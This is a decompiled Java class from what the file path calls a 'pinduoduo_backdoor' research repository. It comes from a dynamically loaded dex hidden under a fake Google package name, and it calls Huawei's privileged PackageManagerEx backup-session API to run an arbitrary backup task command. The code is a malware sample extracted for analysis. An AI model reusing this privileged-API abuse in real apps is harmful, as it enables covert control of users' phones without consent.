package com.google.android.sd.biz_dynamic_dex.a;

import android.os.IBackupSessionCallback;
import com.huawei.android.app.PackageManagerEx;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

public final class a {
  public static String a(String paramString) {
    String[] arrayOfString = new String[1];
    CountDownLatch countDownLatch = new CountDownLatch(1);
    int i = PackageManagerEx.startBackupSession((IBackupSessionCallback)new IBackupSessionCallback.Stub(arrayOfString, paramString, countDownLatch) {
          public final void onTaskStatusChanged(int param1Int1, int param1Int2, int param1Int3, String param1String) {
            if (param1Int3 != 3) {
              if (param1Int3 < 0) {
                String[] arrayOfString = this.a;
                StringBuilder stringBuilder = new StringBuilder("statusCode=");
                stringBuilder.append(param1Int3);
                stringBuilder.append(" [");
                stringBuilder.append(param1String);
                stringBuilder.append("] [");
                stringBuilder.append(this.b);
                stringBuilder.append("]");
                arrayOfString[0] = stringBuilder.toString();
                this.c.countDown();
                return;
              } 
              if (param1Int3 == 0) {
                try {
                  PackageManagerEx.finishBackupSession(param1Int1);
                } catch (Exception exception) {}
                this.c.countDown();
              } 
            } 
          }
        });
    if (i == -1 || i == -2) {
      arrayOfString[0] = "startBackupSession fail";
      return arrayOfString[0];
    } 
    if (PackageManagerEx.executeBackupTask(i, paramString) > 0) {
      try {
        if (!countDownLatch.await(3000L, TimeUnit.MILLISECONDS))
          arrayOfString[0] = "timeout"; 
      } catch (InterruptedException interruptedException) {
        arrayOfString[0] = "interrupted_exception";
      } 
    } else {
      arrayOfString[0] = "task_id <= 0";
    } 
    return arrayOfString[0];
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\da03be2689cc463f901806b5b417c9f5-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\a\a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */